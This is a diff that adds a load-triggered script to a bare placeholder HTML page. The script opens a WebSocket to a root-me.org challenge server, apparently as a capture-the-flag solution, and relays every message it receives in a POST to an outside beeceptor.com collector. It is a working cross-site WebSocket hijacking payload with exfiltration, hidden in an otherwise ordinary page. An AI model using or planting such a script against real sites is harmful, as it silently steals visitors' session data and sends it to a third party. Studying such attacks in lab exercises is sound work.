@@ -2,6 +2,26 @@
 <html>
   <head>
     <title>This is the title of the webpage!</title>
+    <script>
+      window.addEventListener("load", () => {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", 'https://websocket-test.free.beeceptor.com', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        var connection = new WebSocket('ws://challenge01.root-me.org:58036/ws');
+
+        connection.onopen = function () {
+          connection.send('hello');
+        };
+
+        connection.onmessage = function (message) {
+          xhr.send(JSON.stringify({
+            message: message["data"]
+          }));
+        };
+
+      });
+    </script>
   </head>
   <body>
     <p>This is an example paragraph. Anything in the <strong>body</strong> tag will appear on the page, just like this <strong>p</strong> tag and its contents.</p>
